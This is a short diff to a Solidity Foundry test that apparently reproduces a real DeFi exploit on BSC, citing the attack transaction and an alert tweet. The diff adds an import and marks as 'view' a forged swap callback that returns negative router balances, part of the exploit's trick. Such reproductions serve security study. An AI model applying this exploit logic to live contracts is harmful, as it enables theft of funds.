@@ -3,6 +3,8 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
 /*
     Attack tx: https://explorer.phalcon.xyz/tx/bsc/0x93ae5f0a121d5e1aadae052c36bc5ecf2d406d35222f4c6a5d63fef1d6de1081
     Tweet alert: https://twitter.com/Phalcon_xyz/status/1737355152779030570
@@ -86,7 +88,7 @@ contract ContractTest is Test {
         int256 amountSpecified,
         uint160 sqrtPriceLimitX96,
         bytes calldata data
-    ) external returns (int256 amount0, int256 amount1) {
+    ) external view returns (int256 amount0, int256 amount1) {
         return (-int256(IERC20(usd).balanceOf(router)), -int256(IERC20(usd).balanceOf(router)));
     }
 
